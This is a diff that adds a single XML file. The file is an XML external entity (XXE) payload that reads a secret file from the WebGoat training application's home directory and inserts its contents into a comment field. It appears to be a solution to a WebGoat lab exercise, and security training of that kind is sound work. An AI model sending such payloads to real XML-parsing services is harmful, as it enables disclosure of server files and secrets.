@@ -1,0 +1,6 @@
+<?xml version="1.0"?>
+<!DOCTYPE root [
+<!ENTITY xxe SYSTEM "file:///home/webgoat/.webgoat-8.0.0.M25/XXE/secret.txt">
+]>
+
+<comment><text>&xxe;</text></comment>
